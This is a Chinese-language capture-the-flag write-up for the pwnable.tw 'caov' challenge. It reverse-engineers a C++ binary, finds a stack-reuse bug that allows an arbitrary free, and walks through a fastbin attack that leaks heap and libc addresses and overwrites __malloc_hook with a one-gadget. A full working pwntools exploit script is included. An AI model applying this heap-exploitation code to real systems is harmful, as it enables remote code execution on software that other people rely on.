# Pwnable Caov


人生自是有情痴，此恨不关风雨月。 			——《玉楼春》欧阳修

## 题目保护

![image-20210716144239067](https://gitee.com/nopnoping/img/raw/master/img/image-20210716144239067.png)

没有开ASLR保护，其它保护全开，话不多说，上IDA，直接开整。

## 漏洞分析

题目是用C++编写的，给了源代码，但是从代码中看不出漏洞，所以只能从IDA来分析。用IDA分析C++程序最关键的就是构建对象的结构。

在main函数中，new了一个0x30大小的空间，并随后就对该空间的数据进行了赋值，可以合理推测，这里创建了对象，并且对象的大小为0x30。

![image-20210716144626205](https://gitee.com/nopnoping/img/raw/master/img/image-20210716144626205.png)

进入显示函数，我们可以很容易的得到对象各个数据段的意义。

![image-20210716145016868](https://gitee.com/nopnoping/img/raw/master/img/image-20210716145016868.png)

逆向出数据结构后，我们就可以好好的分析程序了。

在图中所示的程序处，存在一个储存于栈地址的对象，并且在程序的开始处，对该对象进行了解构。同时我们发现该函数是在sub_401396调用后随后调用，没有对栈地址清零，因此可以使用stack-reuse技术，构造栈地址上的对象，从而可以任意free，实施fast bin攻击。

![image-20210716145118187](https://gitee.com/nopnoping/img/raw/master/img/image-20210716145118187.png)

## 漏洞利用

在漏洞利用前，我们需要理清楚程序的逻辑。在重新编辑阶段，程序会经历new1->free_arb->(new2)->show->free1。其中new1和free1是相对应的，free_arb即我们使用stack-reuse释放的堆块。new2仅将输入的长度小于1000并且将输入的长度大于现今的长度时才调用，注意这个很关键，后面的利用会常用到这个特征。

想要获得shell，我们就需要泄露libc，而如果我们可以控制对象的key值，就可以实现任意读。但是对象是被分配在堆上的，所以想要泄露libc，首先得泄露heap。如何泄露heap？程序凡是涉及输入的，都会在输入数据的末尾加上\x00，因此如果想通过堆块残留的数据来进行泄露，是不行的。该如何？既然利用残留的数据不行，那么我们就将正在使用的堆块释放，将堆块链表数据覆盖本身的值，进而来输出。

思路就很清晰了，利用free_arb释放一个堆块，new2分配到，然后再free_arb同一个块，利用上述条件使此时new2不满足条件，进而show泄露出heap。这一段的代码如下：

````python
enter_name('aaa')
enter_info("a"*0x28,1) 
#leak heap address
#0x60
fake_chunk=p64(0)+p64(0x41)+p64(0)*6+p64(0)+p64(0x21)+p64(0)*2
edit(fake_chunk+p64(name+0x10),0x30,'a'*0x30,1) 
edit_name(fake_chunk+p64(name+0x10))
ru("after")
ru("Key: ")
heap=u64(ru("\n").ljust(8,b'\x00'))
# target_heap=heap-(0xd50-0xc60)
target_heap=heap+0xcd0-0xc90
info_addr("heap",heap)
info_addr("target_heap",target_heap)
````

泄露libc就很容易了，由于开了FULL RELRO保护，GOT表会在程序运行时，提前加载好，因此如果修改key为GOT地址，就可以泄露libc了。具体的做法是用泄露的heap，计算对象所在堆块，然后free_arb，再new2分配到，进而修改。

```python
#leak libc address
fake_chunk=p64(0)+p64(0x41)+p64(heap)+p64(0)*6+p64(0x21)+p64(0)*2
edit(fake_chunk+p64(target_heap+0x10),0x30,p64(got),2)
ru("after")
ru("Key: ")
libc_base=u64(ru("\n").ljust(8,b'\x00'))-libc.symbols["exit"]
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
#0x4526a (0x30) 0xef6c4 (0x50) 0xf0567 (0x70)
one_gadget=libc_base+0xef6c4
info_addr("libc_base",libc_base)
info_addr("malloc_hook",malloc_hook)
info_addr("one_gadget",one_gadget)
```

打malloc_hook即可获得shell，具体思路与上面一致。

```python
#attack
fake_chunk=p64(0)+p64(0x71)+p64(0)*10+p64(name+0x10)+p64(0)*2+p64(0x21)
edit_name(fake_chunk)
fake_chunk=p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(fake_chunk,0x60,'a',2)
edit(p64(0),0x60,b'\x00'*0x13+p64(one_gadget),2)
```

## CODE

全部代码如下

```python
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote("chall.pwnable.tw",10306)
else:
	sh=process('./caov')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-v']
	gdb.attach(sh,command)

def choice(elect):
	ru(':')
	sl(str(elect).encode())

def edit(name,length,key,value):
    choice(2)
    enter_name(name)
    ru("length:")
    sl(str(length).encode())
    enter_info(key,value)

def show():
	choice(1)

def enter_name(name):
    ru("name:")
    sl(name)

def enter_info(key,value):
    ru("ey:")
    sl(key)
    ru("alue:")
    sl(str(value).encode())

def edit_name(name):
    choice(2)
    enter_name(name)
    ru("length:")
    sl("1024".encode())

def exp():
    #libc=ELF("/glibc/2.23/64/lib/libc-2.23.so")
    libc=ELF("./libc_64.so")
    name=0x6032C0
    got=0x602F20
    #debug("b*0x00000000004014F5  \nc")
    enter_name('aaa')
    enter_info("a"*0x28,1)
    #leak heap address
    #0x60
    fake_chunk=p64(0)+p64(0x41)+p64(0)*6+p64(0)+p64(0x21)+p64(0)*2
    edit(fake_chunk+p64(name+0x10),0x30,'a'*0x30,1)
    edit_name(fake_chunk+p64(name+0x10))
    ru("after")
    ru("Key: ")
    heap=u64(ru("\n").ljust(8,b'\x00'))
   # target_heap=heap-(0xd50-0xc60)
    target_heap=heap+0xcd0-0xc90
    info_addr("heap",heap)
    info_addr("target_heap",target_heap)

    #leak libc address
    fake_chunk=p64(0)+p64(0x41)+p64(heap)+p64(0)*6+p64(0x21)+p64(0)*2
    edit(fake_chunk+p64(target_heap+0x10),0x30,p64(got),2)
    ru("after")
    ru("Key: ")
    libc_base=u64(ru("\n").ljust(8,b'\x00'))-libc.symbols["exit"]
    malloc_hook=libc_base+libc.symbols["__malloc_hook"]
    #0x4526a (0x30) 0xef6c4 (0x50) 0xf0567 (0x70)
    one_gadget=libc_base+0xef6c4
    info_addr("libc_base",libc_base)
    info_addr("malloc_hook",malloc_hook)
    info_addr("one_gadget",one_gadget)

    #attack
    fake_chunk=p64(0)+p64(0x71)+p64(0)*10+p64(name+0x10)+p64(0)*2+p64(0x21)
    edit_name(fake_chunk)
    fake_chunk=p64(0)+p64(0x71)+p64(malloc_hook-0x23)
    edit(fake_chunk,0x60,'a',2)
    edit(p64(0),0x60,b'\x00'*0x13+p64(one_gadget),2)
    debug()
    itr()

exp()

```




